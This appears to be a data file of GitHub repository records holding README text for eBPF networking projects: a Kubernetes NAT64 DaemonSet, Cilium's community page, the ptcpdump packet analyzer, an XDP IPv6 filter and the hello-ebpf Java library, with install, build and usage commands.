             |  | H1 |---|         |         |  +----+       |
             |  +----+   |      +-------+    |  192.0.2.1    |
             |2001:db8::1|------| NAT64 |----|               |
             |           |      +-------+    |               |
             |           |         |         |               |
             +---------------------+         +---------------+

              [rfc6146](https://datatracker.ietf.org/doc/html/rfc6146)

### DNS64

The main problem with DNS64 in Kubernetes is that the DNS service use to be implemented as
a Deployment, so the Pods only can communicate via IPv6 with the upstream DNS server. This is
one of the main problems why we need this solution, to be able to get rid from this [hack we
have to use in KIND](https://github.com/kubernetes-sigs/kind/blob/7c2f6c1dcd332c039ac3e7d3e3dc0dd1ec2e6a6d/hack/ci/e2e-k8s.sh#L213-L238) , since the Github runners are IPv4 only.

We can just forward requests to [a public DNS64 server](https://developers.google.com/speed/public-dns/docs/dns64), also CoreDNS has a [DNS64 plugin](https://coredns.io/plugins/dns64/)

### NAT64

This is more tricky, one of the common solutions is to use an external gateway to perform NAT64, but that requires additional infrastructure and probable more cost and complexity, and is hard to implement on CI systems with [KIND](https://kind.sigs.k8s.io/) that run
nested on VMs.

One of the nice things of Kubernetes, is that it is decoupled of the underlying infrastructure, in a Kubernetes IPv6-only cluster the family depends on the [addresses assigned to the different API objects](https://kubernetes.io/docs/concepts/cluster-administration/networking/#cluster-network-ipfamilies), so Pods, Services and Nodes only have IPv6 address and communicate using them, but the infrastructure can be dual-stack.
Using VMs with with dual stack addresses can allow use to implement NAT64 in the host.

There are [many implementations of Open Source NAT64](https://ripe85.ripe.net/presentations/78-ripe85-open-source-nat64.pdf) but I didn't find any of them that was able to fit my needs, in terms of simplicity, performance, dependencies, ...

Some time ago [I hacked a solution proxying IPv6 on IPv4](https://github.com/aojea/tproxy64/) but it was just that ... a hack. However, I've found out recently that [android
has a NAT64 implementation in eBPF](https://android.googlesource.com/platform//system/netd/+/c753c3d3735396a9686b3447bae6bdea85ebb1e2/bpf_progs/clatd.c) and started to think more about this ...

The main problem is that we need to implement [Stateful NAT64](https://datatracker.ietf.org/doc/html/rfc6146), and writing the NAT/conntrack logic is complex and hard to support, not mentioning that both NAT/conntrack systems are not synchronized so there can be [collisions and packet drops](https://github.com/cilium/cilium/issues/23604#issuecomment-1832040160) :/

I also wanted this solution simple to troubleshoot and hermetic, so I remember my old days configuring routers, and I liked the existing solutions using a NAT64 interface.

With all of these ideas I came up with this solution that basically goes as:

1. The program runs as Daemonset all nodes

1. It configures a dummy interface named `nat64` by default

```sh
5: nat64: <BROADCAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc noqueue state UNKNOWN group default qlen 1000
    link/ether ca:a6:ab:76:fb:7c brd ff:ff:ff:ff:ff:ff
    inet 169.254.64.0/24 scope global nat64
       valid_lft forever preferred_lft forever
    inet6 64:ff9b::/96 scope global
       valid_lft forever preferred_lft forever
    inet6 fe80::c8a6:abff:fe76:fb7c/64 scope link
       valid_lft forever preferred_lft forever
```

1. This interface has assigned two subnets

   1. The IPv6 one is the IPv4 in IPv6 prefx, the default is `64:ff9b::/96` per rfc6052

   1. The IPv4 one is `169.254.64.0/24`, link-local also alleviates the risk of leaking traffic or overlapping.

1. The packets with IPv6 prefix that are directed are NAT64 stateless

   1. Pod IPv6 saddr is replaced by one address in the IPv4 configured range

   1. Destination IPv6 has the destination IP4 embedded

1. After the static NAT is performed, the packet goes through the kernel again and is MASQUERADE to the Internet with the IPv4 of the host, replacing the IPv4 from the `nat64` interface range.

1. When the packet comes back, the MASQUERADE is reverted and the packet is destinted to the `nat64`interface where the static NAT64 is reverted.

   1. Source IPv6 address is the IPv4 in IPv6 address

   1. Destination IPv6 address is the one we used in the step 4.

## Install

Just do `kubectl apply -f https://raw.githubusercontent.com/aojea/nat64/main/install.yaml`


## Development

Assuming you have checked out the repo and you are already in the repo folder

1. Install kind cluster with IPv6 only

```yaml
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
featureGates:
networking:
  ipFamily: ipv6
nodes:
- role: control-plane
- role: worker
```

```sh
kind create cluster --name ipv6 --config kind-ipv6.yaml
```

1. Build project (it already compiles the eBPF code too)

```sh
docker build . -t aojea/nat64:v0.1.0
```

1. Preload the image in the kind cluster we just created

```sh
kind load docker-image aojea/nat64:v0.1.0 --name ipv6
```

1. Install the nat64 daemonset

```sh
kubectl apply -f install.yaml
```

in case you already have it installed you can rollout restart the daemonset or just delete and create again

```sh
kubectl delete -f install.yaml  && kubectl apply -f install.yaml
```

1. Once it is installed you can test it by creating a pod and checking the connectivity to IPv4 sites using the NAT64 prefix:

```sh
$ kubectl run test --image k8s.gcr.io/e2e-test-images/agnhost:2.39 --command -- /agnhost netexec --http-port=8080
$ kubectl exec -it test bash
...
# UDP test
dig @64:ff9b::8.8.8.8 www.google.es
# TCP test
curl [64:ff9b::140.82.121.4]:80
```

## TODO

This is far to be complete, features and suggestions are welcome:

- [ ] metrics: number of NAT64 translations: connection, packets, protocol, ...
- [ ] Right now the algorithm to map 6 to 4 is very simple, use the latest digit from the Pod IPv6 address, this limits us to 254 connection, is that enough?
- [x] TCP and UDP checksum (fixed by @siwiutki)
- [ ] ICMP
- [ ] Testing, testing, ....

## Contributors

@siwiutki

## References

- https://datatracker.ietf.org/doc/html/rfc6052
- https://datatracker.ietf.org/doc/html/rfc6146
- https://datatracker.ietf.org/doc/html/rfc6145
- https://blog.dan.drown.org/clatd-on-android/
"
cilium/community,18,92,18,8,Shell,Here you can find community content around Cilium,2023-02-21T14:42:20Z,2025-10-10T17:11:18Z,282,"# Community

Here you can find community content around Cilium.

## Contribute

Check out the [contributor ladder](CONTRIBUTOR-LADDER.md) for different ways to get involved and level up within the project. You can see different roles within the project in the [contributor roles](CONTRIBUTOR-ROLES.md). If you have already contributed to the project but it isn't caputured in the code, please add yourself to the [contributor file](CONTRIBUTORS.md).

## Socializing

Connect with the community through:

* Follow us on [Twitter](https://twitter.com/ciliumproject), [LinkedIn](https://www.linkedin.com/company/cilium/), and our [blog](https://cilium.io/blog/)
* Chat with us on [Slack](https://slack.cilium.io/)
* Subscribe to [the newsletter](https://cilium.io/newsletter)
* Subscribe to the [eBPF and Cilium Community on Youtube](https://www.youtube.com/channel/UCJFUxkVQTBJh3LD1wYBWvuQ)

## Governance

Find out more about Cilium's governance [here](./GOVERNANCE.md).

## Values

The [Cilium Community Values](https://github.com/cilium/community/blob/main/VALUES.md) are guideposts to contributors (both new and ongoing) for how the project runs. They are meant to capture the spirit of the project of how we all work collaboratively together.

## Vision

Learn the Cilium project direction, vision, and scope in the [Vision](https://github.com/cilium/community/blob/main/VISION.md). It is meant to capture where we are going together.
"
mozillazg/ptcpdump,1107,58,1107,23,C,"Process-aware, eBPF-based tcpdump",2024-04-05T08:59:43Z,2025-10-12T12:07:38Z,303,"# ptcpdump

<div id=""top""></div>

[![amd64-e2e](https://img.shields.io/github/actions/workflow/status/mozillazg/ptcpdump/test.yml?label=x86_64%20(amd64)%20e2e)](https://github.com/mozillazg/ptcpdump/actions/workflows/test.yml)
[![arm64-e2e](https://img.shields.io/circleci/build/gh/mozillazg/ptcpdump/master?label=aarch64%20(arm64)%20e2e)](https://app.circleci.com/pipelines/github/mozillazg/ptcpdump?branch=master)
[![Release](https://img.shields.io/github/v/release/mozillazg/ptcpdump)](https://github.com/mozillazg/ptcpdump/releases)
![Coveralls](https://img.shields.io/coverallsCoverage/github/mozillazg/ptcpdump?branch=master)
English | [ä¸­æ–‡](README.zh-CN.md)


ptcpdump is a tcpdump-compatible packet analyzer powered by eBPF,
automatically annotating packets with process/container/pod metadata when detectable.
Inspired by [jschwinger233/skbdump](https://github.com/jschwinger233/skbdump).

![](./docs/wireshark.png)

Table of Contents
=================

* [Features](#features)
* [Installation](#installation)
    * [Requirements](#requirements)
* [Usage](#usage)
    * [Example commands](#example-commands)
    * [Example output](#example-output)
    * [Running with Docker](#running-with-docker)
    * [Backend](#backend)
    * [Flags](#flags)
* [Compare with tcpdump](#compare-with-tcpdump)
* [Developing](#developing)
    * [Dependencies](#dependencies)
    * [Building](#building)


## Features

* ðŸ” Process/container/pod-aware packet capture.
* ðŸ“¦ Filter by: `--pid` (process), `--pname` (process name), `--container-id` (container), `--pod-name` (pod).
* ðŸŽ¯ tcpdump-compatible flags (`-i`, `-w`, `-c`, `-s`, `-n`, `-C`, `-W`, `-A`, and more).
* ðŸ“œ Supports `pcap-filter(7)` syntax like tcpdump.
* ðŸŒ³ tcpdump-like output + process/container/pod context.
* ðŸ“‘ Verbose mode shows detailed metadata for processes and containers/pods.
* ðŸ’¾ PcapNG with embedded metadata (Wireshark-ready).
* ðŸŒ Cross-namespace capture (`--netns`).
* ðŸš€ Kernel-space BPF filtering (low overhead, reduces CPU usage).
* âš¡ Container runtime integration (Docker, containerd).


## Installation

You can download the statically linked executable for x86_64 and arm64 from the [releases page](https://github.com/mozillazg/ptcpdump/releases).


### Requirements

Linux kernel >= 5.2 (compiled with BPF and BTF support).

<details>

`ptcpdump` optionally requires debugfs. It has to be mounted in /sys/kernel/debug.
In case the folder is empty, it can be mounted with:

    mount -t debugfs none /sys/kernel/debug


The following kernel configuration is required. Building as Modules is also
possible.

| Option                    | Backend                   | Note                   |
|---------------------------|---------------------------|------------------------|
| CONFIG_BPF=y              | both                      | **Required**           |
| CONFIG_BPF_SYSCALL=y      | both                      | **Required**           |
| CONFIG_DEBUG_INFO=y       | both                      | **Required**           |
| CONFIG_DEBUG_INFO_BTF=y   | both                      | **Required**           |
| CONFIG_KPROBES=y          | both                      | **Required**           |
| CONFIG_KPROBE_EVENTS=y    | both                      | **Required**           |
| CONFIG_TRACEPOINTS=y      | both                      | **Required**           |
| CONFIG_PERF_EVENTS=y      | both                      | **Required**           |
| CONFIG_NET=y              | both                      | **Required**           |
| CONFIG_NET_SCHED=y        | tc                        | **Required**           |
| CONFIG_NET_CLS_BPF=y      | tc                        | **Required**           |
| CONFIG_NET_ACT_BPF=y      | tc                        | **Required**           |
| CONFIG_NET_SCH_INGRESS=y  | tc                        | **Required**           |
| CONFIG_CGROUPS=y          | cgroup-skb                | **Required**           |
| CONFIG_CGROUP_BPF=y       | cgroup-skb                | **Required**           |
| CONFIG_FILTER=y           | socket-filter             | **Required**           |
| CONFIG_BPF_TRAMPOLINE=y   | tp-btf                    | **Required**           |
| CONFIG_SECURITY=y         | both                      | Optional (Recommended) |
| CONFIG_BPF_TRAMPOLINE=y   | both                      | Optional (Recommended) |
| CONFIG_SOCK_CGROUP_DATA=y | both                      | Optional (Recommended) |
| CONFIG_BPF_JIT=y          | both                      | Optional (Recommended) |
| CONFIG_CGROUP_BPF=y       | tc, tp-btf, socket-filter | Optional (Recommended) |
| CONFIG_CGROUPS=y          | tc, tp-btf, socket-filter | Optional (Recommended) |

You can use `zgrep $OPTION /proc/config.gz` to validate whether an option is enabled.

</details>

<p align=""right""><a href=""#top"">ðŸ”</a></p>


## Usage

### Example commands

Filter like tcpdump:

    sudo ptcpdump -i eth0 tcp
    sudo ptcpdump -i eth0 -A -s 0 -n -v tcp and port 80 and host 10.10.1.1
    sudo ptcpdump -i any -s 0 -n -v -C 100MB -W 3 -w test.pcapng 'tcp and port 80 and host 10.10.1.1'
    sudo ptcpdump -i eth0 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0'

Multiple interfaces:

    sudo ptcpdump -i eth0 -i lo

Filter by process or user:

    sudo ptcpdump -i any --pid 1234 --pid 233 -f
    sudo ptcpdump -i any --pname curl
    sudo ptcpdump -i any --uid 1000

Capture by process via run target program:

    sudo ptcpdump -i any -- curl ubuntu.com

Filter by container or pod:

    sudo ptcpdump -i any --container-id 36f0310403b1
    sudo ptcpdump -i any --container-name test
    sudo ptcpdump -i any --pod-name test.default

Save data in PcapNG format:

    sudo ptcpdump -i any -w demo.pcapng
    sudo ptcpdump -i any -w - port 80 | tcpdump -n -r -
    sudo ptcpdump -i any -w - port 80 | tshark -r -


Capturing interfaces in other network namespaces:

    sudo ptcpdump -i lo --netns /run/netns/foo --netns /run/netns/bar
    sudo ptcpdump -i any --netns /run/netns/foobar
    sudo ptcpdump -i any --netns /proc/26/ns/net


<p align=""right""><a href=""#top"">ðŸ”</a></p>


### Example output


Default:

    09:32:09.718892 vethee2a302f wget.3553008 In IP 10.244.0.2.33426 > 139.178.84.217.80: Flags [S], seq 4113492822, win 64240, length 0, ParentProc [python3.834381], Container [test], Pod [test.default]
    09:32:09.718941 eth0 wget.3553008 Out IP 172.19.0.2.33426 > 139.178.84.217.80: Flags [S], seq 4113492822, win 64240, length 0, ParentProc [python3.834381], Container [test], Pod [test.default]

With `-q`:

    09:32:09.718892 vethee2a302f wget.3553008 In IP 10.244.0.2.33426 > 139.178.84.217.80: tcp 0, ParentProc [python3.834381], Container [test], Pod [test.default]
    09:32:09.718941 eth0 wget.3553008 Out IP 172.19.0.2.33426 > 139.178.84.217.80: tcp 0, ParentProc [python3.834381], Container [test], Pod [test.default]

With `-v`:

    13:44:41.529003 eth0 In IP (tos 0x4, ttl 45, id 45428, offset 0, flags [DF], proto TCP (6), length 52)
        139.178.84.217.443 > 172.19.0.2.42606: Flags [.], cksum 0x5284, seq 3173118145, ack 1385712707, win 118, options [nop,nop,TS val 134560683 ecr 1627716996], length 0
        Process (pid 553587, cmd /usr/bin/wget, args wget kernel.org)
        User (uid 1000)
        ParentProc (pid 553296, cmd /bin/sh, args sh)
        Container (name test, id d9028334568bf75a5a084963a8f98f78c56bba7f45f823b3780a135b71b91e95, image docker.io/library/alpine:3.18, labels {""io.cri-containerd.kind"":""container"",""io.kubernetes.container.name"":""test"",""io.kubernetes.pod.name"":""test"",""io.kubernetes.pod.namespace"":""default"",""io.kubernetes.pod.uid"":""9e4bc54b-de48-4b1c-8b9e-54709f67ed0c""})
        Pod (name test, namespace default, UID 9e4bc54b-de48-4b1c-8b9e-54709f67ed0c, labels {""run"":""test""}, annotations {""kubernetes.io/config.seen"":""2024-07-21T12:41:00.460249620Z"",""kubernetes.io/config.source"":""api""})

Using `--context` to limit context to include in the output:

<details>

    # --context=process
    09:32:09.718892 vethee2a302f wget.3553008 In IP 10.244.0.2.33426 > 139.178.84.217.80: Flags [S], seq 4113492822, win 64240, length 0
    
    # -v --context=process
    13:44:41.529003 eth0 In IP (tos 0x4, ttl 45, id 45428, offset 0, flags [DF], proto TCP (6), length 52)
        139.178.84.217.443 > 172.19.0.2.42606: Flags [.], cksum 0x5284, seq 3173118145, ack 1385712707, win 118, options [nop,nop,TS val 134560683 ecr 1627716996], length 0
        Process (pid 553587, cmd /usr/bin/wget, args wget kernel.org)
    
    # -v --context=process,parentproc,container,pod
    # or -v --context=process --context=parentproc --context=container --context=pod
    13:44:41.529003 eth0 In IP (tos 0x4, ttl 45, id 45428, offset 0, flags [DF], proto TCP (6), length 52)
        139.178.84.217.443 > 172.19.0.2.42606: Flags [.], cksum 0x5284, seq 3173118145, ack 1385712707, win 118, options [nop,nop,TS val 134560683 ecr 1627716996], length 0
        Process (pid 553587, cmd /usr/bin/wget, args wget kernel.org)
        ParentProc (pid 553296, cmd /bin/sh, args sh)
        Container (name test, id d9028334568bf75a5a084963a8f98f78c56bba7f45f823b3780a135b71b91e95, image docker.io/library/alpine:3.18, labels {""io.cri-containerd.kind"":""container"",""io.kubernetes.container.name"":""test"",""io.kubernetes.pod.name"":""test"",""io.kubernetes.pod.namespace"":""default"",""io.kubernetes.pod.uid"":""9e4bc54b-de48-4b1c-8b9e-54709f67ed0c""})
        Pod (name test, namespace default, UID 9e4bc54b-de48-4b1c-8b9e-54709f67ed0c, labels {""run"":""test""}, annotations {""kubernetes.io/config.seen"":""2024-07-21T12:41:00.460249620Z"",""kubernetes.io/config.source"":""api""})
</details>

With `-A`:

    14:44:34.457504 ens33 curl.205562 Out IP 10.0.2.15.39984 > 139.178.84.217.80: Flags [P.], seq 2722472188:2722472262, ack 892036871, win 64240, length 74, ParentProc [bash.180205]
    E..r.,@.@.o.
    .....T..0.P.E..5+g.P.......GET / HTTP/1.1
    Host: kernel.org
    User-Agent: curl/7.81.0
    Accept: */*
    

With `-x`:

    14:44:34.457504 ens33 curl.205562 Out IP 10.0.2.15.39984 > 139.178.84.217.80: Flags [P.], seq 2722472188:2722472262, ack 892036871, win 64240, length 74, ParentProc [bash.180205]
            0x0000:  4500 0072 de2c 4000 4006 6fbf 0a00 020f
            0x0010:  8bb2 54d9 9c30 0050 a245 a0fc 352b 6707
            0x0020:  5018 faf0 ecfe 0000 4745 5420 2f20 4854
            0x0030:  5450 2f31 2e31 0d0a 486f 7374 3a20 6b65
            0x0040:  726e 656c 2e6f 7267 0d0a 5573 6572 2d41
            0x0050:  6765 6e74 3a20 6375 726c 2f37 2e38 312e
            0x0060:  300d 0a41 6363 6570 743a 202a 2f2a 0d0a
            0x0070:  0d0a

With `-X`:

    14:44:34.457504 ens33 curl.205562 Out IP 10.0.2.15.39984 > 139.178.84.217.80: Flags [P.], seq 2722472188:2722472262, ack 892036871, win 64240, length 74, ParentProc [bash.180205]
            0x0000:  4500 0072 de2c 4000 4006 6fbf 0a00 020f  E..r.,@.@.o.....
            0x0010:  8bb2 54d9 9c30 0050 a245 a0fc 352b 6707  ..T..0.P.E..5+g.
            0x0020:  5018 faf0 ecfe 0000 4745 5420 2f20 4854  P.......GET / HT
            0x0030:  5450 2f31 2e31 0d0a 486f 7374 3a20 6b65  TP/1.1..Host: ke
            0x0040:  726e 656c 2e6f 7267 0d0a 5573 6572 2d41  rnel.org..User-A
            0x0050:  6765 6e74 3a20 6375 726c 2f37 2e38 312e  gent: curl/7.81.
            0x0060:  300d 0a41 6363 6570 743a 202a 2f2a 0d0a  0..Accept: */*..
            0x0070:  0d0a                                     ..


<p align=""right""><a href=""#top"">ðŸ”</a></p>


### Running with Docker

Docker images for `ptcpdump` are published at https://quay.io/repository/ptcpdump/ptcpdump.

    docker run --privileged --rm -t --net=host --pid=host \
      -v /sys/fs/cgroup:/sys/fs/cgroup:ro \
      -v /var/run:/var/run:ro \
      -v /run:/run:ro \
      quay.io/ptcpdump/ptcpdump:latest ptcpdump -i any -c 2 tcp

<p align=""right""><a href=""#top"">ðŸ”</a></p>


### Backend


ptcpdump supports specifying a particular eBPF technology for packet capture through the
`--backend` flag.

|                         | `tc`                      | `cgroup-skb`               | `socket-filter`               | `tp-btf`                |
|-------------------------|---------------------------|----------------------------|-------------------------------|-------------------------|
| eBPF Program Type       | `BPF_PROG_TYPE_SCHED_CLS` | `BPF_PROG_TYPE_CGROUP_SKB` | `BPF_PROG_TYPE_SOCKET_FILTER` | `BPF_PROG_TYPE_TRACING` |
| L2 data                 | âœ…                         | âŒ                          | âœ…                             | âœ…                       |
| Cross network namespace | âŒ                         | âœ…                          | âŒ                             | âœ…                       |
| Kernel version          | 5.2+                      | 5.2+                       | 5.4+                          | 5.5+                    |
| cgroup v2               | Recommended               | **Required**               | Recommended                   | Recommended             |


If this flag isn't specified, it defaults to `tc`.

<details>

* Running `curl http://1.1.1.1` on the host:

<details>

  * `--backend tc`:

        $ sudo ptcpdump -i any --backend tc host 1.1.1.1

        12:11:28.009276 ens33 curl.402475 Out IP 10.0.2.15.48448 > 1.1.1.1.80: Flags [S], seq 615672474, win 64240, options [mss 1460,sackOK,TS val 2168208063 ecr 0,nop,wscale 7], length 0, ParentProc [bash.321004]
        12:11:28.113779 ens33 curl.402475 In IP 1.1.1.1.80 > 10.0.2.15.48448: Flags [S.], seq 1810787293, ack 615672475, win 64240, options [mss 1460], length 0, ParentProc [bash.321004]
        12:11:28.113852 ens33 curl.402475 Out IP 10.0.2.15.48448 > 1.1.1.1.80: Flags [.], seq 615672475, ack 1810787294, win 64240, length 0, ParentProc [bash.321004]
        12:11:28.114216 ens33 curl.402475 Out IP 10.0.2.15.48448 > 1.1.1.1.80: Flags [P.], seq 615672475:615672545, ack 1810787294, win 64240, length 70, ParentProc [bash.321004]
        12:11:28.115383 ens33 curl.402475 In IP 1.1.1.1.80 > 10.0.2.15.48448: Flags [.], seq 1810787294, ack 615672545, win 64240, length 0, ParentProc [bash.321004]
        12:11:28.534486 ens33 curl.402475 In IP 1.1.1.1.80 > 10.0.2.15.48448: Flags [P.], seq 1810787294:1810787680, ack 615672545, win 64240, length 386, ParentProc [bash.321004]
        12:11:28.534751 ens33 curl.402475 Out IP 10.0.2.15.48448 > 1.1.1.1.80: Flags [.], seq 615672545, ack 1810787680, win 63854, length 0, ParentProc [bash.321004]
        12:11:28.536982 ens33 curl.402475 Out IP 10.0.2.15.48448 > 1.1.1.1.80: Flags [F.], seq 615672545, ack 1810787680, win 63854, length 0, ParentProc [bash.321004]
        12:11:28.538160 ens33 curl.402475 In IP 1.1.1.1.80 > 10.0.2.15.48448: Flags [.], seq 1810787680, ack 615672546, win 64239, length 0, ParentProc [bash.321004]
        12:11:28.642291 ens33 curl.402475 In IP 1.1.1.1.80 > 10.0.2.15.48448: Flags [FP.], seq 1810787680, ack 615672546, win 64239, length 0, ParentProc [bash.321004]
        12:11:28.642511 ens33 curl.402475 Out IP 10.0.2.15.48448 > 1.1.1.1.80: Flags [.], seq 615672546, ack "
Raihan-009/IPv6-packet-filter-xdp,1,0,1,0,C,,2024-05-12T13:26:17Z,2024-06-06T07:04:02Z,10,"# IPv6-packet-filter-xdp


## Table of Contents

- [Introduction](#introduction)
- [Dependencies](#dependencies)
- [Installation](#installation)
- [Setting Up Pseudo Environment and Testing Connectivity](#setting-up-pseudo-environment-and-testing-connectivity)
- [Building and Loading BPF Code](#building-and-loading-bpf-code)
- [Testing Connectivity](#testing-connectivity)
- [Exploring with tcpdump](#exploring-with-tcpdump)
- [Clean Up](#clean-up)
- [References](#reference)


## Introduction

`eBPF` (extended Berkeley Packet Filter) is a revolutionary technology that allows for programmability within the Linux kernel. It enables the execution of sandboxed user-defined programs, providing efficient and flexible packet processing, tracing, and monitoring capabilities. `XDP` (eXpress Data Path) is a specific use case of eBPF tailored for high-performance packet processing at the network driver level. It operates directly on incoming packets before they reach the kernel's networking stack, allowing for ultra-fast packet filtering, forwarding, and manipulation with minimal overhead. Together, eBPF and XDP empower developers to implement complex networking functions with unprecedented speed and efficiency.

This project provides a packet filtering mechanism using XDP (eXpress Data Path) for IPv6 traffic. It aims to enhance network security and performance by filtering IPv6 packets at the kernel level.

## Dependencies

Before getting started, ensuring that the following dependencies are installed on our `Ubuntu` system:

```bash
sudo apt install clang llvm libelf-dev libpcap-dev build-essential libc6-dev-i386
sudo apt install linux-headers-$(uname -r)
sudo apt install linux-tools-common linux-tools-generic
```

## Installation
To get started with this project, follow these steps:

1. Clone this repository to local machine using `git clone git@github.com:Raihan-009/IPv6-packet-filter-xdp.git`.
2. Navigate to the project directory: `cd IPv6-packet-filter-xdp`.
3. Follow the `Makefile` for further operations or follow the Doc.


## Setting Up Pseudo Environment and Testing Connectivity

The environment setup involves creating a network namespace named ""node"" and configuring two virtual Ethernet interfaces (`veth-u` and `veth-k`). One end of the virtual link (`veth-u`) is moved into the ""node"" namespace while the other end (`veth-k`) remains in the default namespace. IP addresses are assigned to each interface, enabling communication between processes within the ""node"" namespace and the default namespace. XDP code will be loaded in veth-k.

Here is the demo illustration.

![pseduo env](https://github.com/Raihan-009/IPv6-packet-filter-xdp/blob/main/pseduo-env.png?raw=true)

To set up a pseudo environment and test connectivity:

```bash
make pseudo-env
```

For making pseudo network environment:
```bash
sudo ip netns add node
sudo ip link add dev veth-u type veth peer name veth-k
sudo ip link set veth-u netns node
sudo ip netns exec node ip addr add 192.168.1.1/24 dev veth-u
sudo ip netns exec node ip link set dev veth-u up
sudo ip addr add 192.168.1.2/24 dev veth-k
sudo ip link set up dev veth-k
```
- Test connectivity for IPv4
    ```bash
    make test-connectivity
    ```
- Test connectivity for IPv6:
    ```bash
    make get-ipv6
    make exec-node
    ping6 fe80::c4b5:26ff:fe32:2535
    ```

## Building and Loading BPF Code

To build and load the BPF (Berkeley Packet Filter) code:

```bash
make build-bpf
make load-bpf
```

BPF code at a glance

```c
// XDP program //
SEC(""xdp_drop"")
int xdp_ipv6_filter_program(struct xdp_md *ctx)
{
    void *data_end = (void *)(long)ctx->data_end;
    void *data     = (void *)(long)ctx->data;
    struct ethhdr *eth = data;
    __u16 h_proto;

   if (data + sizeof(struct ethhdr) > data_end)
        return XDP_DROP;

    h_proto = eth->h_proto;

    // Check if the Ethernet type is IPv6 //
    if (h_proto == htons(ETH_P_IPV6))
        return XDP_DROP;

    return XDP_PASS;
}
```
## Testing Connectivity

   - Test Connectivity for IPv4
        ```bash
        make test-connectivity
        ```

   - Test Connectivity for IPv6
        ```bash
        make get-ipv6
        make exec-node
        ping6 fe80::c4b5:26ff:fe32:2535
        ```

***Expected Output***
![test-connectivity](https://github.com/Raihan-009/IPv6-packet-filter-xdp/blob/main/test-connectivity.png?raw=true)

## Exploring with tcpdump

For exploring more `tcpdump` utility can do a great job! 
```bash
sudo tcpdump -i veth-k
```

## Clean Up

To clean up the environment:

```bash
make clean
```

## References

1. [eBPF XDP: The Basics and a Quick Tutorial](https://www.tigera.io/learn/guides/ebpf/ebpf-xdp/)
2. [A brief introduction to XDP and eBPF](https://blogs.igalia.com/dpino/2019/01/07/introduction-to-xdp-and-ebpf/)
3. [Learning-ebpf](https://github.com/lizrice/learning-ebpf)
4. [XDP Tutorial](https://github.com/xdp-project/xdp-tutorial)"
parttimenerd/hello-ebpf,166,19,166,5,Java,Hello eBPF world! Hello Java world! Let's discover eBPF together and write Java user-land library along the way.,2023-12-01T20:24:28Z,2025-10-06T08:04:41Z,250,"Hello eBPF
==========

There are [user land libraries](https://ebpf.io/what-is-ebpf/#development-toolchains) for [eBPF](https://ebpf.io) that allow you to
write eBPF applications in C++, Rust, Go, Python and even
Lua. But there are none for Java, which is a pity.
So... I decided to write my own, which allows you to write
eBPF programs directly in Java.

This is still in the early stages, but you can already use it for developing small tools
and more coming in the future.

![Overview images](img/overview.svg)

_Based on the overview from [ebpf.io](https://ebpf.io/what-is-ebpf/), 
duke image from [OpenJDK](https://wiki.openjdk.org/display/duke/Gallery)._

Let's discover eBPF together. Join me on the journey and learn a lot about eBPF and Java along the way.

Example
-------
Consider for a brief moment that you want to test how your server application behaves when every third incoming
network packet is dropped. We can write a simple eBPF program to do this:

```java
@BPF(license = ""GPL"")
public abstract class XDPDropEveryThirdPacket extends BPFProgram implements XDPHook {

  final GlobalVariable<@Unsigned Integer> count = new GlobalVariable<>(0);

  @BPFFunction
  public boolean shouldDrop() {
    return count.get() % 3 == 1;
  }

  @Override // runs directly in the kernel on every incoming packet
  public xdp_action xdpHandlePacket(Ptr<xdp_md> ctx) {
    // this code is actually compiled to the C code that is executed in the kernel
    count.set(count.get() + 1);
    return shouldDrop() ? xdp_action.XDP_DROP : xdp_action.XDP_PASS;
  }

  // runs in user land
  public static void main(String[] args) throws InterruptedException {
    try (XDPDropEveryThirdPacket program = BPFProgram.load(XDPDropEveryThirdPacket.class)) {
      // attach the xdpHandlePacket method to the network interface
      program.xdpAttach(XDPUtil.getNetworkInterfaceIndex());
      // print the current packet count in a loop
      while (true) {
        System.out.println(""Packet count "" + program.count.get());
        Thread.sleep(1000);
      }
    }
  }
}
```

You can find this example as [XDPDropEveryThirdPacket.java](bpf-samples/src/main/java/me/bechberger/ebpf/samples/XDPDropEveryThirdPacket.java).

Goals
-----
Provide a library (and documentation) for Java developers to explore eBPF and
write their own eBPF programs, like firewalls, directly in Java, using the [libbpf](https://libbpf.readthedocs.io/en/latest/)
under the hood.

The goal is neither to replace existing eBPF libraries nor to provide a higher abstractions.

Prerequisites
-------------

These might change in the future, but for now, you need the following:

Either a Linux machine with the following:

- Linux 64-bit (or a VM)
- Java 22 or later
- libbpf and bpf-tool
  - e.g. `apt install libbpf-dev linux-tools-common linux-tools-$(uname -r)` on Ubuntu
- root privileges (for executing the eBPF programs)

- On Mac OS, you can use the [Lima VM](https://lima-vm.io/) (or use the `hello-ebpf.yaml` file as a guide to install the prerequisites):

```sh
limactl start hello-ebpf.yaml --mount-writable
limactl shell hello-ebpf sudo bin/install.sh
limactl shell hello-ebpf

# You'll need to be root for most of the examples
sudo -s PATH=$PATH
```

The scheduler examples require a 6.12+ kernel (install on ubuntu via the [mainline](https://github.com/bkw777/mainline) tool)
or a patched 6.11 kernel with the scheduler extensions, you can get it from
[here](https://launchpad.net/~arighi/+archive/ubuntu/sched-ext-unstable).
You might also be able to run [CachyOS](https://cachyos.org/) and install a patched kernel from there.

Blog Posts
----------
Posts covering the development of this project:

- Dec 01, 2023: [Finding all used Classes, Methods, and Functions of a Python Module](https://mostlynerdless.de/blog/2023/12/01/finding-all-used-classes-methods-and-functions-of-a-python-module/)
- Dec 11, 2023: [From C to Java Code using Panama](https://mostlynerdless.de/blog/2023/12/11/from-c-to-java-code-using-panama/)
- Jan 01, 2024: [Hello eBPF: Developing eBPF Apps in Java (1)](https://mostlynerdless.de/blog/2023/12/31/hello-ebpf-developing-ebpf-apps-in-java-1/)
- Jan 12, 2024: [Hello eBPF: Recording data in basic eBPF maps (2)](https://mostlynerdless.de/blog/2024/01/12/hello-ebpf-recording-data-in-basic-ebpf-maps-2/)
- Jan 29, 2024: [Hello eBPF: Recording data in perf event buffers (3)](https://mostlynerdless.de/blog/2024/01/29/hello-ebpf-recording-data-in-event-buffers-3/)
- Feb 12, 2024: [Hello eBPF: Tail calls and your first eBPF application (4)](https://mostlynerdless.de/blog/2024/02/12/hello-ebpf-tail-calls-and-your-first-ebpf-application-4/)
- Feb 26, 2024: [Hello eBPF: First steps with libbpf (5)](https://mostlynerdless.de/blog/2024/02/26/hello-ebpf-first-steps-with-libbpf-5/)
- Mar 12, 2024: [Hello eBPF: Ring buffers in libbpf (6)](https://mostlynerdless.de/blog/2024/03/12/hello-ebpf-ring-buffers-in-libbpf-6/)
